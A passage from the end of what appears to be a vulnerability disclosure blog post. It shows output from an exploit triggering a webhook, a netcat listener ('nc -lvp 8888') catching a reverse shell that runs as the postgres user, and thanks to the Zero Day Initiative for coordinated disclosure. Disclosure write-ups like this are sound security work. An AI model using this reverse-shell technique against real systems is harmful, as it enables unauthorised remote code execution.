<span><span>Attempting to trigger the webhook...</span></span>
<span><span>Target: http://localhost</span></span>
<span><span>Default project id: phc_GrjBdVEYFyzRkF0vBcGi0I21V20H9pkqtwPSj93tjE</span></span>
<span><span>Successfully triggered the webhook!</span></span>
<span></span>
<span><span>// ON THE ANOTHER CONSOLE</span></span>
<span><span>‚ûú ~ nc -lvp 8888</span></span>
<span><span>listening on [any] 8888 ...</span></span>
<span><span>172.31.208.1: Inverse host lookup failed: Unknown host</span></span>
<span><span>connect to [172.31.221.180] from (UNKNOWN) [172.31.208.1] 56218</span></span>
<span><span>bash: cannot set terminal process group (26003): Not a tty</span></span>
<span><span>bash: no job control in this shell</span></span>
<span><span>8a495483618:/data$ id</span></span>
<span><span>uid=70(postgres) gid=70(postgres) groups=70(postgres)</span></span></code></pre></div>



<h2>Zero Day Initiative (ZDI)</h2>



<p>I would like to extend my sincere thanks to the <strong><mark>Zero Day Initiative (ZDI)</mark></strong> for their support and coordination throughout the responsible disclosure process.</p>



<p>From initial triage to vendor communication and remediation tracking, ZDI played a critical role in ensuring that these vulnerabilities were handled responsibly and transparently.</p>



<p>Responsible disclosure is rarely a single-person effort. It requires collaboration between researchers, coordinators, and vendors‚Äîand ZDI continues to set a high standard for how that collaboration should work!</p>



<figure><p></p></figure>
</article></div>
  </body>
</html>
